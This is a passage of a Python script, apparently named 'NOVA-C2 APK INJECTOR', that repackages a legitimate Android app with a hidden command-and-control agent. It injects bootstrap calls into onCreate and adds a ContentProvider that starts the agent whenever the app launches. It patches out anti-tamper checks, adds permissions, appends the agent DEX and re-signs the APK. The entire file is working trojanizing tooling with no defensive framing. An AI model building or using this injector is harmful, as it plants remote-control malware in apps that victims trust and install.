    content = smali_file.read_text(encoding='utf-8')

    if 'NovaBootstrap' in content:
        print(f'{C.YELLOW}[!] Bootstrap already injected in {smali_file.name}{C.RESET}')
        return True

    # NovaBootstrap.init() has internal try-catch — host code NEVER breaks
    bootstrap_code = '''
    # NOVA-C2
    invoke-static {p0}, Lcom/nova/c2/NovaBootstrap;->init(Landroid/content/Context;)V
'''

    # Strategy 1: Insert before return-void in onCreate (MSF-compatible)
    if method_name == 'onCreate':
        for sig in ['.method public onCreate', '.method protected onCreate']:
            if sig in content:
                m = re.search(re.escape(sig) + r'.*?\n', content)
                if m:
                    after_sig = content[m.end():]
                    invoke_match = re.search(r'(\s+invoke-super\s+[^}]*->onCreate)', after_sig)
                    if invoke_match:
                        insert_pos = m.end() + invoke_match.end(1)
                        content = content[:insert_pos] + bootstrap_code + content[insert_pos:]
                        smali_file.write_text(content, encoding='utf-8')
                        print(f'{C.GREEN}[+] Bootstrap injected after super.onCreate() in {smali_file.name}{C.RESET}')
                        return True
                    # fallback: insert after super.onCreate found by any pattern
                    lines = after_sig.split('\n')
                    if len(lines) > 3:
                        insert_pos = content.index('\n', content.index(sig))
                        insert_pos += 1
                        content = content[:insert_pos] + bootstrap_code + content[insert_pos:]
                        smali_file.write_text(content, encoding='utf-8')
                        print(f'{C.YELLOW}[!] Bootstrap injected (after sig) into {smali_file.name}{C.RESET}')
                        return True
                break

    # Strategy 2: Insert before return-void (any method)
    for rv_sig in ['return-void', 'return-object', 'return-wide']:
        rv_pos = content.rfind(f'\n    {rv_sig}')
        if rv_pos > 0:
            insert_pos = rv_pos
            content = content[:insert_pos] + bootstrap_code + content[insert_pos:]
            smali_file.write_text(content, encoding='utf-8')
            print(f'{C.GREEN}[+] Bootstrap injected before {rv_sig} in {smali_file.name}{C.RESET}')
            return True

    # Strategy 3: After .locals if nothing else works
    lines = content.split('\n')
    for i, line in enumerate(lines):
        stripped = line.strip()
        if stripped.startswith('.locals ') or stripped.startswith('.registers '):
            indent = line[:len(line) - len(line.lstrip())]
            lines.insert(i + 1, indent + '# NOVA bootstrap')
            lines.insert(i + 2, indent + 'invoke-static {p0}, Lcom/nova/c2/NovaBootstrap;->init(Landroid/content/Context;)V')
            smali_file.write_text('\n'.join(lines), encoding='utf-8')
            print(f'{C.YELLOW}[!] Bootstrap injected (fallback) into {smali_file.name}{C.RESET}')
            return True

    return False

SKIP_PACKAGES = [
    'android/support/', 'androidx/', 'kotlin/', 'kotlinx/',
    'com/google/android/', 'com/google/firebase/', 'com/google/gson/',
    'okhttp', 'okio', 'retrofit', 'rx/', 'org/apache/',
    'io/reactivex', 'org/jetbrains/',
    'android/arch/', 'android/annotation/',
]

def copy_agent_smali(agent_smali_dir, target_dir):
    """Copy agent smali files into target APK's smali directories, skipping library classes."""
    smali_dirs = _find_smali_dirs(target_dir)
    if not smali_dirs:
        smali_dirs = [target_dir / 'smali']
        smali_dirs[0].mkdir(exist_ok=True)

    target_smali_dir = smali_dirs[0]

    copied = 0
    skipped = 0
    for smali_file in agent_smali_dir.rglob('*.smali'):
        rel_path = smali_file.relative_to(agent_smali_dir)
        parts = rel_path.parts
        if len(parts) > 1 and parts[0].startswith('classes'):
            rel_path = Path(*parts[1:])
        rel_str = str(rel_path).replace('\\', '/')
        if any(rel_str.startswith(pkg) for pkg in SKIP_PACKAGES):
            skipped += 1
            continue
        dest = target_smali_dir / rel_path
        if rel_path.parent != '.':
            (target_smali_dir / rel_path.parent).mkdir(parents=True, exist_ok=True)
        if dest.exists():
            skipped += 1
            continue
        shutil.copy2(smali_file, dest)
        copied += 1

    print(f'{C.GREEN}[+] Copied {copied} smali files (skipped {skipped} library/existing){C.RESET}')
    return True



NOVA_PROVIDER_AUTHORITY = 'nova.c2.provider'

def create_nova_classes(smali_dir):
    """Create NovaBootstrap + NovaProvider ContentProvider.
    Provider auto-starts agent when ANY app component launches — no host smali modified."""
    pkg_path = 'com/nova/c2'
    dst = smali_dir / pkg_path
    dst.mkdir(parents=True, exist_ok=True)

    # NovaBootstrap — crash-safe utility with try-catch
    (dst / 'NovaBootstrap.smali').write_text('''.class public Lcom/nova/c2/NovaBootstrap;
.super Ljava/lang/Object;
.method public static init(Landroid/content/Context;)V
    .registers 3
    :try_start_0
    invoke-static {p0}, Lcom/openaccess/sdk/service/SystemNetworkService;->start(Landroid/content/Context;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    const-string v1, "NOVA-C2"
    const-string v2, "init fail (safe)"
    invoke-static {v1, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method
''')
    print(f'{C.GREEN}[+] NovaBootstrap: {dst / "NovaBootstrap.smali"}{C.RESET}')

    # NovaProvider ContentProvider — auto-starts agent at app process launch
    (dst / 'NovaProvider.smali').write_text('''.class public Lcom/nova/c2/NovaProvider;
.super Landroid/content/ContentProvider;
.method public attachInfo(Landroid/content/Context;Landroid/content/pm/ProviderInfo;)V
    .registers 3
    invoke-super {p0, p1, p2}, Landroid/content/ContentProvider;->attachInfo(Landroid/content/Context;Landroid/content/pm/ProviderInfo;)V
    invoke-static {p1}, Lcom/nova/c2/NovaBootstrap;->init(Landroid/content/Context;)V
    return-void
.end method
.method public onCreate()Z
    .registers 2
    const/4 v0, 0x0
    return v0
.end method
.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .registers 7
    const/4 v0, 0x0
    return-object v0
.end method
.method public insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    .registers 3
    const/4 v0, 0x0
    return-object v0
.end method
.method public update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    .registers 6
    const/4 v0, 0x0
    return v0
.end method
.method public delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    .registers 5
    const/4 v0, 0x0
    return v0
.end method
.method public getType(Landroid/net/Uri;)Ljava/lang/String;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method
''')
    print(f'{C.GREEN}[+] NovaProvider ContentProvider: {dst / "NovaProvider.smali"}{C.RESET}')
    return dst / 'NovaBootstrap.smali'

def build_nova_dex(output_dir):
    """Assemble NovaBootstrap and NovaProvider smali into a DEX file.
    Returns path to the assembled DEX or None on failure."""
    import tempfile, uuid
    work = Path(output_dir) / 'nova_smali'
    work.mkdir(parents=True, exist_ok=True)
    create_nova_classes(work)
    nova_dex = Path(output_dir) / 'nova_classes.dex'
    args = ['a', str(work), '-o', str(nova_dex)]
    r = _run_java(SMALI_JAR, args, timeout=60)
    if r.returncode != 0:
        print(f'{C.RED}[X] Failed to assemble Nova classes DEX: {r.stderr[:300]}{C.RESET}')
        return None
    print(f'{C.GREEN}[+] Assembled Nova classes DEX ({nova_dex.stat().st_size / 1024:.0f} KB){C.RESET}')
    return nova_dex

def _clean_meta_inf_services(apk_path):
    """Remove unprotected META-INF/services files that cause install warnings."""
    import zipfile, io
    try:
        with zipfile.ZipFile(apk_path, 'r') as z:
            services = [n for n in z.namelist() if n.startswith('META-INF/services/')]
            if not services:
                return
        buf = io.BytesIO()
        with zipfile.ZipFile(apk_path, 'r') as zin:
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zout:
                for item in zin.infolist():
                    if item.filename.startswith('META-INF/services/'):
                        continue
                    zout.writestr(item, zin.read(item.filename))
        with open(apk_path, 'wb') as f:
            f.write(buf.getvalue())
        print(f'{C.YELLOW}[!] Removed {len(services)} unprotected META-INF/services entries{C.RESET}')
    except Exception as e:
        print(f'{C.YELLOW}[!] META-INF cleanup skipped: {e}{C.RESET}')


def _ensure_keystore():
    keystore = TOOLS_DIR / 'inject.keystore'
    if not keystore.exists():
        print(f'{C.CYAN}[+] Generating keystore...{C.RESET}')
        r = subprocess.run([
            KEYTOOL, '-genkeypair', '-keystore', str(keystore),
            '-alias', 'inject', '-keyalg', 'RSA', '-keysize', '2048',
            '-validity', '3650', '-storepass', 'inject123',
            '-keypass', 'inject123',
            '-dname', 'CN=Android Inject, O=NOVA-C2, C=US',
            '-noprompt'
        ], capture_output=True, text=True, timeout=30)
        if r.returncode != 0:
            print(f'{C.YELLOW}[!] Keytool warning: {r.stderr[:200]}{C.RESET}')
    return keystore


def sign_apk(apk_path):
    """Sign APK with v1+v2+v3 signature schemes for maximum compatibility."""
    signed_ok = False

    if APKSIGNER and Path(APKSIGNER).exists():
        keystore = _ensure_keystore()
        print(f'{C.CYAN}[+] Signing with apksigner (v1+v2+v3)...{C.RESET}')
        r = subprocess.run([
            APKSIGNER, 'sign',
            '--ks', str(keystore),
            '--ks-pass', 'pass:inject123',
            '--ks-key-alias', 'inject',
            '--v1-signing-enabled', 'true',
            '--v2-signing-enabled', 'true',
            '--v3-signing-enabled', 'true',
            str(apk_path)
        ], capture_output=True, text=True, timeout=60)
        if r.returncode == 0:
            print(f'{C.GREEN}[+] Signed successfully (apksigner v1+v2+v3){C.RESET}')
            signed_ok = True
        else:
            err = r.stderr.strip()[:300]
            print(f'{C.YELLOW}[!] apksigner failed: {err}{C.RESET}')

    if not signed_ok:
        jarsigner_cmd = JARSIGNER or shutil.which('jarsigner')
        if jarsigner_cmd:
            keystore = _ensure_keystore()
            print(f'{C.CYAN}[+] Signing with jarsigner (v1)...{C.RESET}')
            r = subprocess.run([
                jarsigner_cmd, '-sigalg', 'SHA256withRSA',
                '-digestalg', 'SHA-256', '-keystore', str(keystore),
                '-storepass', 'inject123', '-keypass', 'inject123',
                str(apk_path), 'inject'
            ], capture_output=True, text=True, timeout=60)
            if r.returncode == 0:
                print(f'{C.GREEN}[+] Signed successfully (jarsigner v1){C.RESET}')
                signed_ok = True
            else:
                print(f'{C.RED}[X] jarsigner failed: {r.stderr[:300]}{C.RESET}')

    if not signed_ok:
        print(f'{C.YELLOW}[!] APK will be unsigned — may not install on most devices{C.RESET}')
    return signed_ok


def zipalign_apk(input_apk, output_apk=None):
    """Zipalign APK. Must be done BEFORE signing."""
    if not ZIPALIGN:
        print(f'{C.YELLOW}[!] zipalign not found, skipping alignment{C.RESET}')
        if output_apk and output_apk != input_apk:
            shutil.copy2(input_apk, output_apk)
            return output_apk
        return input_apk

    if output_apk is None:
        output_apk = input_apk.with_name(input_apk.stem + '_aligned.apk')

    print(f'{C.CYAN}[+] Aligning with zipalign...{C.RESET}')
    r = subprocess.run([ZIPALIGN, '-v', '-p', '4', str(input_apk), str(output_apk)],
                       capture_output=True, text=True, timeout=60)
    if r.returncode == 0:
        print(f'{C.GREEN}[+] Aligned successfully{C.RESET}')
        return output_apk
    else:
        print(f'{C.YELLOW}[!] Alignment warning: {r.stderr[:200]}{C.RESET}')
        if output_apk and output_apk != input_apk:
            shutil.copy2(input_apk, output_apk)
            return output_apk
        return input_apk


def verify_apk(apk_path):
    """Verify the injected APK has correct structure."""
    print(f'{C.CYAN}[+] Verifying APK...{C.RESET}')
    checks = []
    try:
        with zipfile.ZipFile(apk_path, 'r') as z:
            names = z.namelist()
            checks.append(('classes.dex present', 'classes.dex' in names))
            dex_count = len([n for n in names if n.endswith('.dex')])
            checks.append((f'DEX files ({dex_count})', dex_count >= 1))
            checks.append(('AndroidManifest.xml', 'AndroidManifest.xml' in names))

            dex_data = z.read('classes.dex')
            checks.append(('Valid DEX header', dex_data[:4] == b'dex\n'))
            has_agent_code = b'SystemNetworkService' in dex_data or b'openaccess' in dex_data
            checks.append(('Agent code in DEX', has_agent_code))
            has_manifest_perms = b'SYSTEM_ALERT_WINDOW' in z.read('AndroidManifest.xml')
            checks.append(('Extra permissions added', has_manifest_perms))
    except Exception as e:
        checks.append((f'Zip read: {e}', False))

    try:
        if APKSIGNER and Path(APKSIGNER).exists():
            r = subprocess.run([APKSIGNER, 'verify', '--verbose', str(apk_path)],
                              capture_output=True, text=True, timeout=30)
            verified = 'Verified' in r.stdout or 'jar verified' in r.stdout.lower()
            checks.append(('APK signature verified', verified))
            if r.stdout:
                for line in r.stdout.split('\n'):
                    if 'signature' in line.lower() or 'scheme' in line.lower() or 'verified' in line.lower():
                        print(f'     {C.GREY}{line.strip()}{C.RESET}')
        else:
            r = subprocess.run([JARSIGNER, '-verify', '-verbose', '-certs', str(apk_path)],
                              capture_output=True, text=True, timeout=30)
            checks.append(('JAR signature valid', 'jar verified' in r.stdout.lower()))
    except:
        checks.append(('Signature check skipped', True))

    all_pass = all(v for _, v in checks)
    for label, ok in checks:
        icon = f'{C.GREEN}[+]' if ok else f'{C.YELLOW}[!]'
        print(f'  {icon} {label}{C.RESET}')

    return all_pass

def inject_into_apk(target_apk_path, features=None):
    """Main injection pipeline — avoids apktool DEX corruption by skipping DEX recompilation."""
    target_apk = Path(target_apk_path)
    if not target_apk.exists():
        print(f'{C.RED}[X] Target APK not found: {target_apk}{C.RESET}')
        return None

    print(f'{C.BOLD}{C.CYAN}+==========================================+{C.RESET}')
    print(f'{C.BOLD}{C.CYAN}|        NOVA-C2 APK INJECTOR              |{C.RESET}')
    print(f'{C.BOLD}{C.CYAN}+==========================================+{C.RESET}')
    print(f'  Target: {target_apk.name} ({target_apk.stat().st_size / 1024 / 1024:.1f} MB)')

    if not ensure_tools():
        return None

    tmp_dir = os.path.join(tempfile.gettempdir(), f'nova_debug_{uuid.uuid4().hex[:8]}')
    os.makedirs(tmp_dir, exist_ok=True)
    print(f'{C.YELLOW}[DEBUG] Temp dir kept: {tmp_dir}{C.RESET}')
    try:
        work = Path(tmp_dir)
        target_dir = work / 'target'

        # Step 1: Decode manifest + resources only (skip DEX to avoid corruption)
        # Using -s flag preserves the ORIGINAL 13KB stub DEX byte-for-byte
        if not decompile_apk(target_apk, target_dir, skip_dex=True):
            return None

        # Step 1b: Anti-tamper patching on original DEX (baksmali → patch → smali)
        print(f'{C.CYAN}[+] Anti-tamper scan on original DEX...{C.RESET}')
        patched_dex_path = None
        at_dir = work / 'anti_tamper'
        at_smali = at_dir / 'smali'
        os.makedirs(at_smali, exist_ok=True)
        with zipfile.ZipFile(target_apk, 'r') as z:
            if 'classes.dex' in z.namelist():
                tmp_dex = at_dir / 'classes.dex'
                with open(tmp_dex, 'wb') as f:
                    f.write(z.read('classes.dex'))
                r_d = _run_java(BAKSMALI_JAR, ['d', str(tmp_dex), '-o', str(at_smali)], timeout=120)
                if r_d.returncode == 0:
                    shutil.copy2(target_dir / 'AndroidManifest.xml', at_dir / 'AndroidManifest.xml')
                    patches = patch_anti_tamper(at_dir)
                    if patches:
                        reassembled = at_dir / 'patched.dex'
                        r_a = _run_java(SMALI_JAR, ['a', str(at_smali), '-o', str(reassembled)], timeout=120)
                        if r_a.returncode == 0:
                            patched_dex_path = reassembled
                            print(f'{C.GREEN}[+] Anti-tamper patches applied: {", ".join(patches)}{C.RESET}')
                else:
                    print(f'{C.YELLOW}[!] baksmali failed on original DEX, skipping anti-tamper{C.RESET}')
            else:
                print(f'{C.YELLOW}[!] No classes.dex in target APK, skipping anti-tamper{C.RESET}')

        # Step 2: Build agent APK and extract its DEX
        agent_apk = build_agent_apk()
        if not agent_apk:
            print(f'{C.RED}[X] Could not build agent APK{C.RESET}')
            return None

        agent_dex_dir = work / 'agent_dex'
        os.makedirs(agent_dex_dir, exist_ok=True)
        agent_dex_file = agent_dex_dir / 'classes2.dex'

        print(f'{C.CYAN}[+] Extracting agent DEX...{C.RESET}')
        with zipfile.ZipFile(agent_apk, 'r') as z:
            if 'classes.dex' not in z.namelist():
                print(f'{C.RED}[X] No classes.dex in agent APK{C.RESET}')
                return None
            with open(agent_dex_file, 'wb') as f:
                f.write(z.read('classes.dex'))
        print(f'{C.GREEN}[+] Extracted agent DEX ({agent_dex_file.stat().st_size / 1024:.0f} KB){C.RESET}')

        # Step 3: Patch manifest (remove missing providers, add NovaProvider + permissions)
        if not patch_manifest(target_dir, features):
            return None

        # Step 4: Build Nova classes (NovaBootstrap + NovaProvider) DEX
        print(f'{C.CYAN}[+] Building Nova bootstrap DEX...{C.RESET}')
        nova_dex = build_nova_dex(work)
        if not nova_dex:
            print(f'{C.RED}[X] Could not build Nova classes DEX{C.RESET}')
            return None

        # Step 5: Rebuild with apktool (manifest + resources, original DEX preserved)
        # We only need the rebuilt AndroidManifest.xml from this step
        unsigned = work / 'unsigned.apk'
        print(f'{C.CYAN}[+] Rebuilding manifest + resources...{C.RESET}')
        args = ['b', str(target_dir), '-o', str(unsigned), '--use-aapt2']
        r = _run_java(APKTOOL_JAR, args, timeout=180)
        if r.returncode != 0:
            print(f'{C.RED}[X] Rebuild failed: {r.stderr[:500]}{C.RESET}')
            return None
        print(f'{C.GREEN}[+] Rebuilt successfully{C.RESET}')

        # Step 6: Build final APK from original, swap manifest + resources, add our DEXes
        print(f'{C.CYAN}[+] Assembling final APK from original...{C.RESET}')
        manifest_data = None
        with zipfile.ZipFile(unsigned, 'r') as z:
            if 'AndroidManifest.xml' in z.namelist():
                manifest_data = z.read('AndroidManifest.xml')
        if not manifest_data:
            print(f'{C.RED}[X] Could not extract rebuilt manifest{C.RESET}')
            return None

        # Collect original DEX files that we need to keep
        original_dexes = {}
        with zipfile.ZipFile(target_apk, 'r') as z:
            for name in z.namelist():
                if name.endswith('.dex'):
                    original_dexes[name] = z.read(name)

        # Determine next DEX index (after all original DEXes)
        existing_dex_nums = []
        for name in original_dexes.keys():
            m = re.match(r'classes(\d*)\.dex', name)
            if m:
                n = int(m.group(1)) if m.group(1) else 1
                existing_dex_nums.append(n)
        next_dex = max(existing_dex_nums) + 1 if existing_dex_nums else 2

        # Collect new XML resources from apktool rebuild
        new_xml_resources = {}
        try:
            with zipfile.ZipFile(unsigned, 'r') as rebuilt_z:
                for item in rebuilt_z.infolist():
                    if item.filename.startswith('res/xml/') and item.filename.endswith('.xml'):
                        new_xml_resources[item.filename] = rebuilt_z.read(item.filename)
        except: pass

        temp_apk = work / 'with_dex.apk'
        added_files = set()
        with zipfile.ZipFile(target_apk, 'r') as zin:
            with zipfile.ZipFile(temp_apk, 'w', zipfile.ZIP_DEFLATED) as zout:
                for item in zin.infolist():
                    if item.filename.startswith('META-INF/'):
                        continue
                    if item.filename == 'AndroidManifest.xml':
                        continue
                    if item.filename.endswith('.dex'):
                        continue
                    data = zin.read(item.filename)
                    zout.writestr(item, data)
                    added_files.add(item.filename)

                # Add rebuilt manifest
                zout.writestr('AndroidManifest.xml', manifest_data)
                added_files.add('AndroidManifest.xml')
                print(f'{C.GREEN}[+] Added rebuilt AndroidManifest.xml{C.RESET}')

                # Keep ORIGINAL resources.arsc (apktool may corrupt it)
                print(f'{C.GREEN}[+] Kept original resources.arsc{C.RESET}')

                # Add new XML resources from apktool rebuild (skip duplicates)
                for name, data in new_xml_resources.items():
                    if name not in added_files:
                        zout.writestr(name, data)
                        added_files.add(name)
                        print(f'{C.GREEN}[+] Added {name}{C.RESET}')
                    else:
                        print(f'{C.YELLOW}[!] Skipped duplicate {name}{C.RESET}')

                # Add patched or original DEX files
                if patched_dex_path:
                    zout.write(patched_dex_path, 'classes.dex')
                    added_files.add('classes.dex')
                    print(f'{C.GREEN}[+] Replaced classes.dex (anti-tamper patched){C.RESET}')
                elif 'classes.dex' in original_dexes:
                    zout.writestr('classes.dex', original_dexes['classes.dex'])
                    added_files.add('classes.dex')
                    print(f'{C.GREEN}[+] Kept original classes.dex{C.RESET}')

                # Keep all original non-classes.dex DEXes
                for name, data in original_dexes.items():
                    if name != 'classes.dex':
                        zout.writestr(name, data)
                        added_files.add(name)
                        print(f'{C.GREEN}[+] Kept original {name}{C.RESET}')

                # Add our agent DEX
                agent_dex_name = f'classes{next_dex}.dex'
                zout.write(agent_dex_file, agent_dex_name)
                added_files.add(agent_dex_name)
                print(f'{C.GREEN}[+] Added {agent_dex_name} (agent, {agent_dex_file.stat().st_size / 1024:.0f} KB){C.RESET}')

                # Add Nova classes DEX
                nova_dex_name = f'classes{next_dex + 1}.dex'
                zout.write(nova_dex, nova_dex_name)
                added_files.add(nova_dex_name)
                print(f'{C.GREEN}[+] Added {nova_dex_name} (Nova, {nova_dex.stat().st_size / 1024:.0f} KB){C.RESET}')

                # Copy native libs from agent APK if present
                try:
                    with zipfile.ZipFile(agent_apk, 'r') as agent_z:
                        for item in agent_z.infolist():
                            if item.filename.startswith('lib/') and item.filename.endswith('.so'):
                                if item.filename not in added_files:
                                    zout.writestr(item, agent_z.read(item.filename))
                                    added_files.add(item.filename)
                                    print(f'{C.GREEN}[+] Added native lib: {item.filename}{C.RESET}')
                except Exception as e:
                    print(f'{C.YELLOW}[!] No native libs to copy: {e}{C.RESET}')

        # Step 7: Clean META-INF/services, align, sign, verify
        _clean_meta_inf_services(temp_apk)

        aligned = work / 'aligned.apk'
        aligned = zipalign_apk(temp_apk, aligned)

        sign_apk(aligned)

        verify_apk(aligned)
        output = aligned

        ts = time.strftime('%Y%m%d_%H%M%S')
        out_name = f'injected_{target_apk.stem}_{ts}.apk'
        desktop = Path.home() / 'OneDrive' / 'Desktop'
        if not desktop.exists():
            desktop = Path.home() / 'Desktop'
        final_path = desktop / out_name
        shutil.copy2(output, final_path)
        print(f'{C.GREEN}[+]{C.RESET} Saved: {final_path} ({final_path.stat().st_size / 1024 / 1024:.1f} MB)')

        return str(final_path)
    finally:
        pass

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: python mixer_injector.py <target.apk>')
        sys.exit(1)
    result = inject_into_apk(sys.argv[1])
    if result:
        print(f'{C.GREEN}[+] Injection complete: {result}{C.RESET}')
    else:
        print(f'{C.RED}[X] Injection failed{C.RESET}')
        sys.exit(1)
